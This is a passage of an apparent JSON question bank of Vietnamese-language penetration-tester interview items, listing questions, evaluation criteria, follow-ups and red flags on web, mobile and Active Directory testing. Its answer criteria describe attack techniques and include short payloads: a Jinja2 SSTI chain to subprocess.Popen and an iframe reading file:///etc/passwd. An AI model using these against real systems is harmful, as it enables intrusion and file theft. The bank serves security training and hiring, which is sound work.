          "Đề xuất được cách kiểm tra kết quả và biết khi nào cần tra cứu hoặc hỏi người hướng dẫn."
        ],
        "followUps": [
          "Nếu kết quả chưa đúng, em sẽ kiểm tra bước nào đầu tiên và dựa vào dấu hiệu gì?"
        ],
        "tags": [
          "Burp Suite Pro",
          "Session Handling Rules",
          "Burp Macros",
          "Turbo Intruder",
          "Race Condition Testing"
        ],
        "sourceRefs": [
          "https://portswigger.net/burp/documentation",
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Không xác định được mục tiêu thực hành hoặc nêu cách kiểm tra kết quả không phù hợp."
        ]
      },
      {
        "id": "PENTEST-SKILL-02",
        "role": "Penetration Tester (PenTest)",
        "category": "practical_skills",
        "difficulty": "intermediate",
        "seniority": "fresher_intern",
        "question": "Bài tập Penetration Tester (PenTest): dựa trên Blind SQLi, phối hợp Time-based SQLi, Out-of-Band SQLi, DNS Exfiltration, Binary Search Scripting; đầu ra sẽ được kiểm tra bằng tiêu chí nào?",
        "evaluationCriteria": [
          "Nêu mục đích sử dụng Blind SQLi trong một bài tập hoặc dự án nhỏ.",
          "Trình bày được các bước thực hiện theo thứ tự và phù hợp với Intern/Fresher.",
          "Đề xuất được cách kiểm tra kết quả và biết khi nào cần tra cứu hoặc hỏi người hướng dẫn."
        ],
        "followUps": [
          "Nếu kết quả chưa đúng, em sẽ kiểm tra bước nào đầu tiên và dựa vào dấu hiệu gì?"
        ],
        "tags": [
          "Blind SQLi",
          "Time-based SQLi",
          "Out-of-Band SQLi",
          "DNS Exfiltration",
          "Binary Search Scripting"
        ],
        "sourceRefs": [
          "https://portswigger.net/web-security",
          "https://owasp.org/www-project-top-ten/"
        ],
        "redFlags": [
          "Không xác định được mục tiêu thực hành hoặc nêu cách kiểm tra kết quả không phù hợp."
        ]
      },
      {
        "id": "PENTEST-SKILL-03",
        "role": "Penetration Tester (PenTest)",
        "category": "practical_skills",
        "difficulty": "advanced",
        "seniority": "senior_lead",
        "question": "Vượt qua cơ chế ghim chứng chỉ số SSL (Bypassing SSL Pinning) khi pentest ứng dụng di động Android và iOS: Em sử dụng Frida scripts, Objection và can thiệp mã nguồn tĩnh (Apktool reverse engineering) như thế nào để nghe lén và phân tích toàn bộ lưu lượng API của ứng dụng?",
        "evaluationCriteria": [
          "Android: Khởi chạy Frida server trên thiết bị đã root/giả lập; tiêm Frida script hook vào các hàm kiểm tra chứng chỉ của thư viện mạng phổ biến (OkHttp3 CertificatePinner, TrustManagerImpl)",
          "Can thiệp tĩnh: Dùng Apktool giải nén APK -> Sửa tệp `res/xml/network_security_config.xml` cho phép tin cậy chứng chỉ người dùng cài đặt (User Certificates) -> Đóng gói và ký lại file APK (Uber-apk-signer)",
          "iOS: Sử dụng Objection trên thiết bị Jailbreak chạy lệnh `ios sslpinning disable` để hook vào Security Framework"
        ],
        "followUps": [
          "Cách xử lý khi ứng dụng di động có cơ chế tự phát hiện Root/Jailbreak và tự động thoát app (Root Detection Evasion)?",
          "Làm thế nào để phân tích mã nhị phân Native C/C++ (JNI libraries) bằng Ghidra khi logic kiểm tra pinning được viết bằng mã máy?"
        ],
        "tags": [
          "SSL Pinning Bypass",
          "Frida",
          "Objection",
          "Apktool",
          "Mobile Penetration Testing"
        ],
        "sourceRefs": [
          "https://frida.re/",
          "https://mas.owasp.org/"
        ],
        "redFlags": [
          "Bỏ cuộc không thể pentest API di động khi gặp ứng dụng có bật SSL Pinning"
        ]
      },
      {
        "id": "PENTEST-SKILL-04",
        "role": "Penetration Tester (PenTest)",
        "category": "practical_skills",
        "difficulty": "advanced",
        "seniority": "middle",
        "question": "Khai thác Lỗ hổng Xác thực JWT (JSON Web Tokens): Các kỹ thuật tấn công phổ biến như: Đổi thuật toán sang `none` (None Algorithm), Đánh tráo khóa công khai thành khóa bí mật (HMAC/RSA Key Confusion), và Bẻ khóa khóa bí mật yếu (Weak Secret Cracking với hashcat/jwt-tool)?",
        "evaluationCriteria": [
          "None Algorithm: Thay đổi trường `alg` trong header thành `none` và xóa bỏ chữ ký ở phần cuối token nếu thư viện backend lỏng lẻo chấp nhận token không có chữ ký",
          "Key Confusion: Server dùng RSA (Public Key để verify, Private Key để ký); kẻ tấn công lấy Public Key công khai của server làm khóa bí mật và ký token bằng thuật toán đối xứng HS256",
          "Weak Secret: Sử dụng Hashcat hoặc jwt-tool tấn công từ điển bẻ khóa HMAC secret trong vài giây nếu lập trình viên đặt khóa bí mật ngắn (vd: 'secret', 'jwtkey')"
        ],
        "followUps": [
          "Làm thế nào để khai thác tham số `jwk` (JSON Web Key) hoặc `jku` trong header JWT để ép server tin cậy khóa công khai do kẻ tấn công tự sinh?",
          "Khái niệm JWT Kid Injection (Directory Traversal hoặc SQLi trong tham số `kid`) hoạt động ra sao?"
        ],
        "tags": [
          "JWT Exploitation",
          "None Algorithm",
          "Key Confusion",
          "Hashcat",
          "JWT-tool"
        ],
        "sourceRefs": [
          "https://portswigger.net/web-security",
          "https://jwt.io/"
        ],
        "redFlags": [
          "Nghĩ rằng JWT đã được mã hóa dữ liệu bí mật và không thể bị sửa đổi phần payload"
        ]
      },
      {
        "id": "PENTEST-SKILL-05",
        "role": "Penetration Tester (PenTest)",
        "category": "practical_skills",
        "difficulty": "intermediate",
        "seniority": "middle",
        "question": "Kỹ thuật Khám phá và Trinh sát bề mặt tấn công mở rộng (OSINT & Attack Surface Mapping): Em kết hợp các công cụ tìm kiếm subdomain (Amass, Subfinder), dò quét dịch vụ (Nmap, Masscan) và phân tích lịch sử kho lưu trữ (Waybackurls, GAU) như thế nào để phát hiện các endpoint ẩn hoặc môi trường thử nghiệm bị bỏ quên?",
        "evaluationCriteria": [
          "Thu thập Subdomains thụ động (Passive OSINT qua Certificate Transparency logs, VirusTotal, Shodan) kết hợp vét cạn chủ động (DNS Brute-forcing với từ điển phong phú)",
          "Phân giải IP và lọc máy chủ còn hoạt động bằng httpx; quét cổng nhanh bằng Masscan rồi kiểm tra chi tiết dịch vụ bằng Nmap scripts (-sV -sC)",
          "Đào xới kho lưu trữ lịch sử web (Wayback Machine, Common Crawl) để tìm các endpoint API cũ, file cấu hình sao lưu (.bak, .old) hoặc file tài liệu swagger/openapi nội bộ"
        ],
        "followUps": [
          "Làm thế nào để tìm kiếm các S3 Buckets / Cloud Storage bị cấu hình mở công khai thuộc về tổ chức mục tiêu?",
          "Cách khai thác Google Dorks chuyên sâu để phát hiện tài liệu mật hoặc trang đăng trị quản trị bị lộ?"
        ],
        "tags": [
          "OSINT",
          "Subdomain Enumeration",
          "Nmap",
          "Attack Surface Mapping",
          "Waybackurls"
        ],
        "sourceRefs": [
          "https://nmap.org/",
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Chỉ quét duy nhất tên miền chính của công ty và bỏ qua hàng chục subdomains phụ chứa môi trường thử nghiệm đầy lỗ hổng"
        ]
      },
      {
        "id": "PENTEST-SKILL-06",
        "role": "Penetration Tester (PenTest)",
        "category": "practical_skills",
        "difficulty": "advanced",
        "seniority": "senior_lead",
        "question": "Khai thác Lỗ hổng Chèn mẫu từ phía máy chủ (Server-Side Template Injection - SSTI): Phân biệt SSTI và XSS. Em nhận diện Template Engine đang sử dụng (Jinja2, Twig, Freemarker, Velocity) qua cây quyết định cú pháp `${7*7}`, `{{7*7}}`, `<%= 7*7 %>` và các bước leo thang lên Thực thi mã từ xa (RCE) ra sao?",
        "evaluationCriteria": [
          "SSTI xảy ra khi input người dùng được nối thẳng vào chuỗi template trên máy chủ thay vì truyền dưới dạng biến dữ liệu; XSS thực thi ở trình duyệt nạn nhân, còn SSTI thực thi mã lệnh trực tiếp trên máy chủ",
          "Cây quyết định: Gửi `${7*7}` nếu ra 49 thì có thể là Java/Freemarker; gửi `{{7*7}}` nếu ra 49 thì thử tiếp `{{7*'7'}}` (nếu ra 7777777 là Jinja2, nếu ra 49 là Twig)",
          "Leo thang RCE trong Jinja2 (Python): Đào bới cây phân cấp đối tượng từ chuỗi rỗng: `\"\".__class__.__mro__[1].__subclasses__()` để tìm class `subprocess.Popen` và thực thi lệnh shell"
        ],
        "followUps": [
          "Làm thế nào để khai thác SSTI trong môi trường template engine có bật chế độ hộp cát an toàn (Sandbox Evasion)?",
          "Sự khác biệt giữa SSTI và lỗ hổng Code Injection (eval injection)?"
        ],
        "tags": [
          "SSTI",
          "Server-Side Template Injection",
          "Jinja2 RCE",
          "Payload Crafting",
          "Sandbox Escape"
        ],
        "sourceRefs": [
          "https://portswigger.net/web-security"
        ],
        "redFlags": [
          "Nhầm lẫn SSTI với XSS và chỉ cố gắng chèn thẻ `<script>alert(1)</script>` vào ô template"
        ]
      },
      {
        "id": "PENTEST-SKILL-07",
        "role": "Penetration Tester (PenTest)",
        "category": "practical_skills",
        "difficulty": "intermediate",
        "seniority": "middle",
        "question": "Khai thác Lỗ hổng Tải tệp không an toàn (Unrestricted File Upload): Em vượt qua các tầng kiểm tra bảo vệ (Kiểm tra phần mở rộng đuôi file, Kiểm tra MIME-type trong Content-Type, và Kiểm tra Magic Bytes tiêu đề ảnh) như thế nào để tải lên một Web Shell thành công?",
        "evaluationCriteria": [
          "Vượt qua kiểm tra Extension: Thử các đuôi mở rộng thay thế (.php5, .phtml, .phar), kỹ thuật double extension (.php.png), hoặc ký tự null-byte trong hệ thống cũ (.php%00.jpg)",
          "Vượt qua kiểm tra Content-Type: Dùng Burp Suite sửa đổi header Content-Type thành `image/jpeg` hoặc `image/png` trong khi nội dung body là mã PHP/JSP shell",
          "Vượt qua kiểm tra Magic Bytes / GetImageSize: Chèn mã web shell độc hại vào phần bình luận (EXIF metadata / Comment section) của một bức ảnh GIF/JPEG hợp lệ hợp pháp (Polyglot File)"
        ],
        "followUps": [
          "Nếu máy chủ lưu file tải lên trên dịch vụ lưu trữ đám mây S3 độc lập, kẻ tấn công có thể biến lỗ hổng upload thành Stored XSS hoặc HTML Injection ra sao?",
          "Cách cấu hình an toàn cho thư mục lưu file upload để ngăn chặn hoàn toàn việc thực thi mã lệnh?"
        ],
        "tags": [
          "File Upload Vulnerabilities",
          "Web Shell",
          "MIME-type Bypass",
          "Polyglot Images",
          "Magic Bytes"
        ],
        "sourceRefs": [
          "https://owasp.org/www-project-top-ten/",
          "https://portswigger.net/web-security"
        ],
        "redFlags": [
          "Nghĩ rằng chỉ cần kiểm tra đuôi file ở phía client bằng JavaScript là máy chủ đã an toàn"
        ]
      },
      {
        "id": "PENTEST-SKILL-08",
        "role": "Penetration Tester (PenTest)",
        "category": "practical_skills",
        "difficulty": "advanced",
        "seniority": "middle",
        "question": "Kỹ năng Viết Báo cáo Kiểm thử Xâm nhập Chuyên nghiệp (Penetration Testing Reporting): Em cấu trúc báo cáo như thế nào để phục vụ cả Ban Giám đốc (Executive Summary đánh giá rủi ro kinh doanh) và Đội ngũ Kỹ sư Lập trình (Technical Details, Mã chứng minh Proof-of-Concept, và Hướng dẫn khắc phục chi tiết từng dòng code)?",
        "evaluationCriteria": [
          "Executive Summary: Trực quan hóa rủi ro tổng thể, đánh giá tác động tài chính và pháp lý, xếp hạng độ trưởng thành an ninh của hệ thống, không dùng thuật ngữ kỹ thuật phức tạp",
          "Technical Findings: Mỗi lỗ hổng có cấu trúc chuẩn mực: Tiêu đề, Phân loại CVSS/CWE, Bằng chứng PoC từng bước có ảnh chụp và gói tin HTTP cụ thể (Steps to Reproduce), và Đánh giá khả năng khai thác thực tế",
          "Remediation: Cung cấp giải pháp sửa lỗi rõ ràng từng bước (code snippet an toàn, cấu hình chuẩn), phân biệt giữa giải pháp tình thế tức thời và giải pháp kiến trúc lâu dài"
        ],
        "followUps": [
          "Làm thế nào để giải thích cho khách hàng hiểu một chuỗi kết hợp nhiều lỗ hổng Low-severity có thể dẫn đến hậu quả Critical (Chaining Vulnerabilities)?",
          "Quy trình tổ chức buổi họp báo cáo kết quả (Readout Meeting) và kiểm tra xác minh lại (Retest Verification)?"
        ],
        "tags": [
          "Penetration Testing Report",
          "Executive Summary",
          "Proof-of-Concept",
          "Vulnerability Chaining",
          "Technical Remediation"
        ],
        "sourceRefs": [
          "https://csrc.nist.gov/publications/detail/sp/800-115/final",
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Sao chép nguyên xi văn bản mô tả lý thuyết từ công cụ quét vào báo cáo mà không có chứng cứ PoC thực tế"
        ]
      },
      {
        "id": "PENTEST-SCEN-01",
        "role": "Penetration Tester (PenTest)",
        "category": "scenario",
        "difficulty": "intermediate",
        "seniority": "fresher_intern",
        "question": "Tại Penetration Tester (PenTest), khi Safe PoC cùng Ethical Pentesting, IDOR in Banking, Data Privacy, Rules of Engagement xuất hiện và em bắt gặp cảnh báo đáng ngờ trong môi trường thực hành được cấp phép, em kiểm tra log hay dữ liệu nào trước?",
        "evaluationCriteria": [
          "Làm rõ hiện tượng và thu thập thông tin trước khi kết luận.",
          "Đề xuất bước xử lý ban đầu an toàn, phù hợp với Intern/Fresher trong Penetration Tester (PenTest).",
          "Biết xác nhận kết quả và báo người hướng dẫn khi vấn đề vượt quá phạm vi hiểu biết."
        ],
        "followUps": [
          "Em sẽ tóm tắt phát hiện và phần chưa chắc chắn với người hướng dẫn như thế nào?"
        ],
        "tags": [
          "Safe PoC",
          "Ethical Pentesting",
          "IDOR in Banking",
          "Data Privacy",
          "Rules of Engagement"
        ],
        "sourceRefs": [
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI",
          "https://owasp.org/www-project-top-ten/"
        ],
        "redFlags": [
          "Đưa ra hành động rủi ro, vượt quyền hoặc bỏ qua bước xác minh và báo cáo."
        ]
      },
      {
        "id": "PENTEST-SCEN-02",
        "role": "Penetration Tester (PenTest)",
        "category": "scenario",
        "difficulty": "advanced",
        "seniority": "senior_lead",
        "question": "Tình huống: Toàn bộ hệ thống web mục tiêu được bảo vệ sau dịch vụ Cloudflare WAF cấu hình rất chặt chẽ, mọi payload khai thác SQLi và XSS của em đều bị chặn với mã lỗi 403 Forbidden. Em áp dụng các kỹ thuật trinh sát và tìm kiếm máy chủ gốc (Origin IP Discovery) như thế nào để vượt qua hoàn toàn bức tường WAF?",
        "evaluationCriteria": [
          "Tìm kiếm địa chỉ IP gốc của máy chủ ẩn sau CDN: Kiểm tra lịch sử DNS cổ điển (SecurityTrails, ViewDNS, Shodan) trước khi hệ thống chuyển sang dùng Cloudflare",
          "Khai thác chức năng gửi email của hệ thống (Đăng ký tài khoản, Quên mật khẩu): nhận email và phân tích Header `Received: from` để tìm IP máy chủ gốc thực sự gửi thư",
          "Kiểm tra chứng chỉ số SSL qua Censys/Censys Search để tìm các máy chủ công khai đang sử dụng cùng chứng chỉ SSL của tên miền mục tiêu; sau đó gửi request trực tiếp tới IP gốc bằng cách gán Host Header"
        ],
        "followUps": [
          "Làm thế nào để khách hàng cấu hình tường lửa ở máy chủ gốc để chỉ chấp nhận kết nối từ các dải IP của Cloudflare nhằm vô hiệu hóa kỹ thuật này?",
          "Nếu không tìm được Origin IP, các phương pháp biến đổi cú pháp nâng cao để vượt qua bộ lọc WAF là gì?"
        ],
        "tags": [
          "WAF Bypass",
          "Origin IP Discovery",
          "Cloudflare Bypass",
          "Censys Recon",
          "Host Header Injection"
        ],
        "sourceRefs": [
          "https://portswigger.net/web-security",
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Bỏ cuộc ngay khi thấy WAF chặn mã lỗi 403 và báo cáo rằng hệ thống hoàn toàn không có lỗ hổng"
        ]
      },
      {
        "id": "PENTEST-SCEN-03",
        "role": "Penetration Tester (PenTest)",
        "category": "scenario",
        "difficulty": "intermediate",
        "seniority": "middle",
        "question": "Tình huống: Khi kiểm thử một tính năng thanh toán giỏ hàng, em nhận thấy giao dịch mua hàng được xử lý qua 3 bước: 1. Tạo đơn hàng -> 2. Áp dụng mã giảm giá -> 3. Trừ tiền tài khoản. Em thiết kế bài kiểm tra điều kiện tranh đoạt (Race Condition) như thế nào để chứng minh một mã voucher chỉ dùng được 1 lần có thể bị áp dụng thành công 10 lần liên tiếp?",
        "evaluationCriteria": [
          "Sử dụng công cụ Turbo Intruder trong Burp Suite hoặc viết script Python đa luồng gửi đồng thời nhiều request áp dụng cùng 1 mã voucher",
          "Sử dụng kỹ thuật 'Single-packet attack' (Gửi 20 HTTP requests trong cùng một gói tin TCP hoặc trong cùng một khung HTTP/2) để tất cả requests tới máy chủ cùng một mili-giây",
          "Quan sát kết quả: nếu backend không sử dụng Database Locking (Pessimistic/Optimistic lock) hoặc Distributed Lock qua Redis, các luồng sẽ cùng đọc trạng thái voucher hợp lệ trước khi kịp cập nhật trạng thái 'Đã sử dụng'"
        ],
        "followUps": [
          "Làm thế nào để hướng dẫn lập trình viên sửa triệt để lỗi Race Condition này bằng giao dịch cơ sở dữ liệu (Database Transactions với Isolation Level)?",
          "Sự khác biệt giữa Race Condition dẫn đến sai lệch số dư tài chính và Race Condition dẫn đến vượt qua xác thực OTP?"
        ],
        "tags": [
          "Race Condition",
          "Single-packet Attack",
          "Turbo Intruder",
          "Voucher Abuse",
          "Concurrency Exploitation"
        ],
        "sourceRefs": [
          "https://portswigger.net/web-security",
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Chỉ thử nhập voucher bằng tay lần lượt từng lần một trên trình duyệt rồi kết luận hệ thống không có lỗi"
        ]
      },
      {
        "id": "PENTEST-SCEN-04",
        "role": "Penetration Tester (PenTest)",
        "category": "scenario",
        "difficulty": "advanced",
        "seniority": "senior_lead",
        "question": "Tình huống: Em được giao kiểm thử xâm nhập mạng nội bộ của một doanh nghiệp theo phạm vi Hộp xám (Gray-box Internal Pentest). Khi cắm máy kiểm thử vào cổng mạng văn phòng, em chỉ được cấp một địa chỉ IP nội bộ không có quyền truy cập Internet. Các bước trinh sát mạng nội bộ (LLMNR/NBT-NS Poisoning với Responder, AS-REP Roasting, và tìm kiếm tài khoản dịch vụ không an toàn) của em diễn ra ra sao?",
        "evaluationCriteria": [
          "Lắng nghe lưu lượng mạng phát tán (Broadcast/Multicast): chạy công cụ Responder để đầu độc các yêu cầu phân giải tên miền LLMNR/NBT-NS và bắt giữ mã băm mật khẩu NTLMv2 hashes của người dùng nội bộ",
          "Thực hiện tấn công AS-REP Roasting nhắm vào các tài khoản Active Directory không bật tính năng xác thực trước Kerberos (Do not require Kerberos preauthentication) để lấy hash và bẻ khóa offline",
          "Dò quét tài nguyên chia sẻ mạng nội bộ mở công khai (SMB Shares) tìm kiếm các tệp cấu hình chứa mật khẩu quản trị viết cứng (.kdbx, .txt, scripts sao lưu)"
        ],
        "followUps": [
          "Làm thế nào để chuyển tiếp mã băm NTLM (NTLM Relay Attack) chiếm quyền máy chủ khác mà không cần bẻ khóa mật khẩu?",
          "Các biện pháp phòng thủ bắt buộc để vô hiệu hóa hoàn toàn LLMNR/NBT-NS trong toàn bộ mạng doanh nghiệp?"
        ],
        "tags": [
          "Internal Pentest",
          "Responder",
          "LLMNR Poisoning",
          "AS-REP Roasting",
          "Active Directory Attacks"
        ],
        "sourceRefs": [
          "https://attack.mitre.org/",
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Chỉ quét cổng Nmap ồn ào làm kích hoạt hệ thống phát hiện xâm nhập và để lộ toàn bộ vị trí máy kiểm thử"
        ]
      },
      {
        "id": "PENTEST-SCEN-05",
        "role": "Penetration Tester (PenTest)",
        "category": "scenario",
        "difficulty": "intermediate",
        "seniority": "middle",
        "question": "Tình huống: Khi kiểm tra một ứng dụng xử lý tài liệu, em phát hiện tính năng xuất file PDF từ nội dung HTML của người dùng sử dụng thư viện wkhtmltopdf phiên bản cũ. Em khai thác lỗ hổng này như thế nào để đọc các tệp tin hệ thống nhạy cảm (như `/etc/passwd` trên Linux hoặc `C:\\Windows\\win.ini` trên Windows)?",
        "evaluationCriteria": [
          "wkhtmltopdf sử dụng một trình duyệt WebKit không đầu (Headless WebKit) nội bộ để render HTML sang PDF",
          "Chèn thẻ HTML độc hại: `<iframe src=\"file:///etc/passwd\" width=\"800\" height=\"600\"></iframe>` hoặc dùng JavaScript đọc file cục bộ qua XMLHttpRequest",
          "Khi máy chủ xuất file PDF trả về cho người dùng, nội dung tệp tin mật hệ thống sẽ được render hiển thị trọn vẹn bên trong trang tài liệu PDF"
        ],
        "followUps": [
          "Làm thế nào để leo thang từ việc đọc file cục bộ (Local File Read) sang tấn công SSRF quét mạng nội bộ của máy chủ backend?",
          "Các biện pháp cấu hình an toàn cho thư viện chuyển đổi PDF (bật cờ `--disable-local-file-access`)?"
        ],
        "tags": [
          "wkhtmltopdf Exploitation",
          "Local File Read",
          "Server-side PDF Generation",
          "Headless Browser Abuse"
        ],
        "sourceRefs": [
          "https://portswigger.net/web-security",
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Chỉ thử chèn chữ bình thường mà không kiểm tra khả năng can thiệp vào giao thức `file://` của công cụ tạo PDF"
        ]
      },
      {
        "id": "PENTEST-SCEN-06",
        "role": "Penetration Tester (PenTest)",
        "category": "scenario",
        "difficulty": "advanced",
        "seniority": "middle",
        "question": "Tình huống: Trong lúc thực hiện pentest theo thỏa thuận với khách hàng, một đoạn mã payload khai thác của em vô tình làm tê liệt dịch vụ cơ sở dữ liệu trên môi trường Staging (Service Crash). Em xử lý sự cố khẩn cấp này như thế nào (thông báo cho ai, ghi nhận log, và phối hợp khôi phục ra sao)?",
        "evaluationCriteria": [
          "Dừng ngay lập tức toàn bộ các hoạt động thử nghiệm trên phân vùng hệ thống đó",
          "Ghi nhận chính xác mốc thời gian, địa chỉ IP nguồn, và đúng chuỗi payload cụ thể vừa gửi đã kích hoạt sự cố crash",
          "Liên hệ ngay lập tức với đầu mối liên lạc khẩn cấp (Emergency Point of Contact) của khách hàng được quy định trong RoE; báo cáo trung thực sự việc và cung cấp thông tin kỹ thuật hỗ trợ đội ngũ vận hành khôi phục dịch vụ"
        ],
        "followUps": [
          "Làm thế nào để rút ra bài học và tinh chỉnh các công cụ kiểm thử nhằm tránh việc gửi các payload có nguy cơ gây Denial of Service trong tương lai?",
          "Quy trình nghiệm thu và kiểm tra an toàn trước khi được phép tiếp tục cuộc kiểm thử?"
        ],
        "tags": [
          "Incident during Pentest",
          "Emergency RoE Protocol",
          "Service Crash Handling",
          "Professional Responsibility"
        ],
        "sourceRefs": [
          "https://csrc.nist.gov/publications/detail/sp/800-115/final",
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Hoảng loạn im lặng giấu giếm sự việc và hy vọng khách hàng không biết là do mình làm sập"
        ]
      },
      {
        "id": "PENTEST-CV-01",
        "role": "Penetration Tester (PenTest)",
        "category": "cv_validation",
        "difficulty": "advanced",
        "seniority": "senior_lead",
        "question": "Trong dự án kiểm thử xâm nhập ứng dụng web/API quy mô lớn mà em ghi trên CV: Hãy chia sẻ về chuỗi khai thác (Exploit Chain) phức tạp và ấn tượng nhất mà em đã tự tay xây dựng để leo thang từ một lỗ hổng mức độ Thấp lên Chiếm quyền điều khiển máy chủ (RCE) hoặc Rò rỉ dữ liệu toàn hệ thống?",
        "evaluationCriteria": [
          "Trình bày mạch lạc chuỗi xâu chuỗi: Bắt đầu từ rò rỉ thông tin nhẹ (Info Disclosure) lấy được tên miền nội bộ -> Khai thác SSRF vượt qua tường lửa vào mạng riêng -> Tìm thấy dịch vụ Redis không đặt mật khẩu ở mạng trong -> Ghi SSH key vào thư mục root của máy chủ để chiếm RCE",
          "Chứng minh tư duy sáng tạo của một Pentester thực chiến thay vì chỉ dựa dẫm vào công cụ quét tự động",
          "Dẫn chứng phản hồi đánh giá cao của khách hàng và việc lỗ hổng đã được khắc phục triệt để"
        ],
        "followUps": [
          "Khó khăn lớn nhất khi vượt qua các hàng rào phòng thủ nhiều lớp trong chuỗi khai thác đó là gì?",
          "Em đã đề xuất giải pháp vá lỗi toàn diện ở tầng kiến trúc ra sao thay vì chỉ vá từng lỗ hổng đơn lẻ?"
        ],
        "tags": [
          "CV Validation",
          "Exploit Chaining",
          "Low to Critical Escalation",
          "Real-world Pentesting",
          "SSRF to RCE"
        ],
        "sourceRefs": [
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Chỉ kể về việc tìm thấy các lỗi đơn lẻ cơ bản như XSS hay CSRF mà không có chuỗi khai thác sâu"
        ]
      },
      {
        "id": "PENTEST-CV-02",
        "role": "Penetration Tester (PenTest)",
        "category": "cv_validation",
        "difficulty": "intermediate",
        "seniority": "middle",
        "question": "CV của em có nhắc đến việc kiểm thử bảo mật ứng dụng di động (Mobile App Pentest iOS và Android). Em đã từng phát hiện lỗ hổng nghiêm trọng nào nằm sâu trong mã nguồn gốc (Insecure Deep Links, Lộ khóa mật mã trong tệp nhị phân, hay Lỗ hổng IPC/Exported Activities) và phương pháp khai thác thực tế của em là gì?",
        "evaluationCriteria": [
          "Mô tả lỗ hổng cụ thể: Insecure Deep Links cho phép ứng dụng bên ngoài kích hoạt chuyển khoản mà không cần xác thực lại mật khẩu",
          "Sử dụng adb commands hoặc xây dựng ứng dụng mã độc thử nghiệm (PoC Android App) để gửi Intent khai thác Exported Component",
          "Phát hiện khóa Private Key mã hóa cơ sở dữ liệu Realm/SQLite lưu trữ dưới dạng chuỗi string viết cứng trong thư viện Shared Object (.so)"
        ],
        "followUps": [
          "Làm thế nào để phân tích dữ liệu lưu trữ không an toàn trong bộ nhớ máy (Insecure Local Storage: SharedPreferences, Keychain)?",
          "Quy trình kiểm tra tính toàn vẹn của ứng dụng chống việc bị can thiệp chèn mã độc và ký lại (Anti-tampering)?"
        ],
        "tags": [
          "Mobile Pentest",
          "Deep Link Exploitation",
          "Exported Activities",
          "Hardcoded Keys",
          "Frida Hooking"
        ],
        "sourceRefs": [
          "https://mas.owasp.org/",
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Chỉ kiểm tra các gói tin HTTP gửi đi của app mà bỏ qua hoàn toàn việc kiểm thử các thành phần bảo mật cục bộ của hệ điều hành di động"
        ]
      },
      {
        "id": "PENTEST-CV-03",
        "role": "Penetration Tester (PenTest)",
        "category": "cv_validation",
        "difficulty": "advanced",
        "seniority": "middle",
        "question": "Em ghi trên CV các chứng chỉ chuyên nghiệp thực hành thực chiến (như OSCP, OSWE, CRTP, Burp Suite Certified Practitioner). Hãy chia sẻ về bài thi thử thách nhất mà em đã vượt qua: cách em quản lý thời gian, tư duy bế tắc (Try Harder mindset) và bài học kỹ thuật lớn nhất rút ra từ kỳ thi đó?",
        "evaluationCriteria": [
          "Chia sẻ trải nghiệm thực tế trong kỳ thi 24/48 giờ áp lực cao: lập kế hoạch phân bổ thời gian rõ ràng, ghi chép tài liệu và ảnh chụp từng bước (Documentation) ngay khi khai thác",
          "Tư duy vượt qua bế tắc (Rabbit Hole): biết khi nào nên dừng lại một hướng tiếp cận không khả thi sau 2 giờ để quay lại rà soát các dịch vụ khác",
          "Nắm vững phương pháp luận kiểm thử có hệ thống hơn là việc thử các payload may rủi"
        ],
        "followUps": [
          "Kỹ năng thực chiến từ kỳ thi đó đã giúp ích trực tiếp cho các dự án pentest khách hàng thực tế sau này như thế nào?",
          "Em đánh giá sự khác biệt giữa môi trường thi phòng thí nghiệm (CTF/Labs) và môi trường sản xuất thực tế của khách hàng?"
        ],
        "tags": [
          "OSCP",
          "OSWE",
          "Practical Certification",
          "Try Harder Mindset",
          "Time Management"
        ],
        "sourceRefs": [
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Khai báo chứng chỉ nhưng không nhớ được cấu trúc bài thi hoặc thừa nhận học thuộc lòng bài giải có sẵn trên mạng"
        ]
      },
      {
        "id": "PENTEST-CV-04",
        "role": "Penetration Tester (PenTest)",
        "category": "cv_validation",
        "difficulty": "intermediate",
        "seniority": "middle",
        "question": "Trong một dự án kiểm thử bảo mật API (RESTful / GraphQL) mà em từng thực hiện trên CV: Những điểm yếu đặc thù của GraphQL (Introspection Query mở, Batching Attacks, Nested Query DoS) hay API Gateway mà em đã trực tiếp khai thác thành công là gì?",
        "evaluationCriteria": [
          "Khai thác GraphQL Introspection Query để tải về toàn bộ lược đồ schema ẩn chứa các câu truy vấn và đột biến (Mutations) quản trị nhạy cảm",
          "Tấn công Nested Query DoS: gửi câu truy vấn lồng nhau hàng chục tầng (Author -> Posts -> Author -> Posts...) làm cạn kiệt tài nguyên CPU/RAM máy chủ",
          "Tấn công GraphQL Batching: nhồi nhét hàng nghìn câu lệnh xác thực OTP vào một request HTTP duy nhất để vượt qua giới hạn Rate Limiting của API Gateway"
        ],
        "followUps": [
          "Làm thế nào để hướng dẫn lập trình viên giới hạn độ sâu của câu truy vấn (Query Depth Limiting) và tính toán độ phức tạp (Query Cost Analysis) trong GraphQL?",
          "Cách kiểm thử phân quyền các trường dữ liệu riêng lẻ (Field-level Authorization)?"
        ],
        "tags": [
          "GraphQL Pentest",
          "Introspection Query",
          "Nested Query DoS",
          "Batching Attack",
          "API Security"
        ],
        "sourceRefs": [
          "https://owasp.org/www-project-top-ten/",
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Đối xử với GraphQL giống hệt như REST API thông thường và bỏ qua các vector tấn công đặc thù của kiến trúc Graph"
        ]
      },
      {
        "id": "PENTEST-CV-05",
        "role": "Penetration Tester (PenTest)",
        "category": "cv_validation",
        "difficulty": "advanced",
        "seniority": "senior_lead",
